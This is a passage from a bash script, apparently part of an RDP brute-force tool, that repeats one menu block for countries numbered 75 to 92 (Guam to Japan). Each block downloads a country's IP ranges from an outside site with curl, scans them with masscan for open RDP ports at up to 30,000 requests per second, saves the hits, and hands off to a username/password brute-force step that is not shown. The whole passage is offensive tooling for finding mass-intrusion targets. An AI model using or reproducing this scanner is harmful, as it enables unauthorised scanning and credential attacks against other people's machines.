echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "75" ]; then
curl http://ipdiapazon.16mb.com/Guam.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "76" ]; then
curl http://ipdiapazon.16mb.com/Guatemala.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "77" ]; then
curl http://ipdiapazon.16mb.com/Guinea-bissau.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "78" ]; then
curl http://ipdiapazon.16mb.com/Haiti.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "79" ]; then
curl http://ipdiapazon.16mb.com/Holy_see.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "80" ]; then
curl http://ipdiapazon.16mb.com/Honduras.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "81" ]; then
curl http://ipdiapazon.16mb.com/Hong_kong.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "82" ]; then
curl http://ipdiapazon.16mb.com/Hungary.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "83" ]; then
curl http://ipdiapazon.16mb.com/Iceland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "84" ]; then
curl http://ipdiapazon.16mb.com/India.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "85" ]; then
curl http://ipdiapazon.16mb.com/Indonesia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "86" ]; then
curl http://ipdiapazon.16mb.com/Iran.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "87" ]; then
curl http://ipdiapazon.16mb.com/Iraq.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "88" ]; then
curl http://ipdiapazon.16mb.com/Ireland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "89" ]; then
curl http://ipdiapazon.16mb.com/Israel.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "90" ]; then
curl http://ipdiapazon.16mb.com/Italy.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "91" ]; then
curl http://ipdiapazon.16mb.com/Jamaica.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "92" ]; then
curl http://ipdiapazon.16mb.com/Japan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
